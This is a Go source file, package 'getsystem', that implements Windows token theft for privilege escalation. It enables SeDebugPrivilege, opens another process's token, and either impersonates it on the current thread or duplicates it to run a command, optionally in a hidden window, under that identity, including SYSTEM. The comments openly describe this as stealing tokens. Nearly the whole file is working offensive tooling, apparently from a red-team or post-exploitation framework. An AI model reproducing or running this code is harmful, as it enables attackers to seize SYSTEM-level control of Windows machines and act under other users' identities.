package getsystem

import (
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	advapi32                    = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procDuplicateTokenEx        = advapi32.NewProc("DuplicateTokenEx")
	procCreateProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
)

// TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY
const (
	OpenProcTokenPerms uint32 = windows.TOKEN_READ | windows.TOKEN_DUPLICATE | windows.TOKEN_IMPERSONATE
	TokenDupPerms      uint32 = windows.TOKEN_QUERY | windows.TOKEN_DUPLICATE | windows.TOKEN_ASSIGN_PRIMARY | windows.TOKEN_ADJUST_DEFAULT | windows.TOKEN_ADJUST_SESSIONID

	sePrivilegeEnabled   = 0x00000002
	flagCreateNewConsole = 0x00000010
)

// OnThrea will steal a token from the given process. It can be other users as well
// not just system. The token will be applied to the current thread until revtoself
// is called, or the thread exits. Only certain processes can have their SYSTEM token
// stolen. You have TOKEN_OWNER in the DACL of the SYSTEM process in order to steal it.
func OnThread(pid int) error {
	tokenH, err := tokenForPid(pid)
	if err != nil {
		return err
	}
	defer tokenH.Close()

	r, _, err := procImpersonateLoggedOnUser.Call(uintptr(tokenH))
	if r == 0 {
		return err
	}
	return nil
}

// InNewProcess will duplicate the token from given pid and start a new process
// using the winapi's DuplicateTokenEx and StartProccessWithTokenW with the given
// command
func InNewProcess(pid int, cmd string, hidden bool) error {
	tokenH, err := tokenForPid(pid)
	if err != nil {
		return err
	}
	var dupTokenH windows.Token
	err = windows.DuplicateTokenEx(
		tokenH,
		TokenDupPerms,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupTokenH,
	)

	if err != nil {
		return fmt.Errorf("duplicateTokenEx | %s", err)
	}

	var show uint16 = windows.SW_NORMAL
	if hidden {
		show = windows.SW_HIDE
	}

	si := &windows.StartupInfo{}
	si.Cb = uint32(unsafe.Sizeof(*si))
	si.Flags |= windows.STARTF_USESHOWWINDOW
	si.ShowWindow = show

	pi := &windows.ProcessInformation{}

	var argvp *uint16
	argvp, err = windows.UTF16PtrFromString(cmd)
	if err != nil {
		return err
	}

	flags := flagCreateNewConsole | windows.CREATE_UNICODE_ENVIRONMENT
	r1, _, e1 := procCreateProcessWithTokenW.Call(
		uintptr(dupTokenH),             // HANDLE                hToken,
		0,                              // DWORD                 dwLogonFlags,
		uintptr(0),                     // LPCWSTR               lpApplicationName,
		uintptr(unsafe.Pointer(argvp)), // LPWSTR                lpCommandLine,
		uintptr(flags),                 // DWORD                 dwCreationFlags,
		uintptr(0),                     // LPVOID                lpEnvironment,
		uintptr(0),                     // LPCWSTR               lpCurrentDirectory,
		uintptr(unsafe.Pointer(si)),    // LPSTARTUPINFOW        lpStartupInfo,
		uintptr(unsafe.Pointer(pi)),    // LPPROCESS_INFORMATION lpProcessInformation
	)
	if r1 == 0 {
		return e1
	}
	return nil
}

func DebugPriv() error {
	return SePrivEnable("SeDebugPrivilege")
}

func SePrivEnable(privString string) (err error) {
	var luid windows.LUID
	err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(privString), &luid)
	if err != nil {
		return fmt.Errorf("sePrivEnable | %s", err)
	}

	privs := &windows.Tokenprivileges{}
	privs.PrivilegeCount = 1
	privs.Privileges[0].Luid = luid
	privs.Privileges[0].Attributes = uint32(sePrivilegeEnabled)

	var tokenH windows.Token
	windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES, &tokenH)
	defer tokenH.Close()

	err = windows.AdjustTokenPrivileges(tokenH, false, privs, uint32(unsafe.Sizeof(privs)), nil, nil)
	if err != nil {
		return fmt.Errorf("sePrivEnable | %s", err)
	}
	return
}

func tokenForPid(pid int) (tokenH windows.Token, err error) {
	hProc, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, true, uint32(pid))
	if err != nil {
		err = fmt.Errorf("tokenForPid | openProcess | %s", err)
		return
	}

	err = windows.OpenProcessToken(hProc, OpenProcTokenPerms, &tokenH)
	if err != nil {
		err = fmt.Errorf("tokenForPid | openToken | %s", err)
	}
	return
}
